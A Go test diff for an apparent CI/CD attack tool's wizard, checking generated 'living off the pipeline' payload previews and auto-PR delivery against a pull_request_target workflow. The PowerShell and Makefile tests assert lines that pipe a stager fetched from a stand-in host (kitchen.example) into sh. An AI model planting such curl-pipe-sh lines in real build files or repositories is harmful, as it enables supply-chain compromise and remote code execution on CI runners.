@@ -383,6 +383,40 @@ func TestBuildWizardStep3LOTP_PreviewMatchesGeneratedPackageJSON(t *testing.T) {
 	assert.NotContains(t, out, "postinstall")
 }
 
+func TestBuildWizardStep3LOTP_PreviewMatchesGeneratedPowershellScript(t *testing.T) {
+	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
+	m.wizard = &WizardState{
+		Step: 3,
+		SelectedVuln: &Vulnerability{
+			Repository:  "messypoutine/gravy-overflow",
+			LOTPTool:    "powershell",
+			LOTPTargets: []string{"scripts/build.ps1"},
+		},
+	}
+
+	out := stripANSI(strings.Join(m.buildWizardStep3LOTP(140), "\n"))
+
+	assert.Contains(t, out, "#!/usr/bin/env pwsh")
+	assert.Contains(t, out, "sh -c 'curl -s ''https://kitchen.example/r/smokedmeat/preview-stager-id'' | sh'")
+	assert.NotContains(t, out, "Invoke-WebRequest")
+}
+
+func TestBuildWizardStep3LOTP_PreviewMatchesGeneratedMakefile(t *testing.T) {
+	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
+	m.wizard = &WizardState{
+		Step: 3,
+		SelectedVuln: &Vulnerability{
+			Repository: "messypoutine/gravy-overflow",
+			LOTPTool:   "make",
+		},
+	}
+
+	out := stripANSI(strings.Join(m.buildWizardStep3LOTP(140), "\n"))
+
+	assert.Contains(t, out, "all:")
+	assert.Contains(t, out, "@curl -s 'https://kitchen.example/r/smokedmeat/preview-stager-id' | sh")
+}
+
 func TestBuildWizardModal_LOTPHidesRawPayloadSummary(t *testing.T) {
 	m := NewModel(Config{SessionID: "test", KitchenExternalURL: "https://kitchen.example"})
 	m.wizard = &WizardState{
@@ -534,6 +568,32 @@ func TestBuildWizardStep2Content_AppTokenWithoutPRWriteShowsBlocked(t *testing.T
 	out := stripANSI(strings.Join(m.buildWizardStep2Content(90), "\n"))
 
 	assert.Contains(t, out, "Create PR (blocked)")
+}
+
+func TestBuildWizardStep2Content_ConfirmedDeliveryUsesRecommendedLabelOnly(t *testing.T) {
+	m := NewModel(Config{SessionID: "test"})
+	m.tokenInfo = &TokenInfo{Value: "ghp_test", Type: TokenTypeClassicPAT}
+	m.wizard = &WizardState{
+		Step: 2,
+		SelectedVuln: &Vulnerability{
+			ID:         "V001",
+			Repository: "acme/api",
+			Workflow:   ".github/workflows/ci.yml",
+			Context:    "pr_body",
+			Trigger:    "pull_request_target",
+		},
+		DeliveryMethod: DeliveryAutoPR,
+		Preflight: &counter.DeployPreflightResponse{
+			Capabilities: map[string]counter.DeployPreflightCapability{
+				deployCapabilityPR: {State: deployStateConfirmed},
+			},
+		},
+	}
+
+	out := stripANSI(strings.Join(m.buildWizardStep2Content(90), "\n"))
+
+	assert.Contains(t, out, "Create PR Recommended")
+	assert.NotContains(t, out, "previously confirmed")
 }
 
 func TestHelpCommandsForPhase(t *testing.T) {
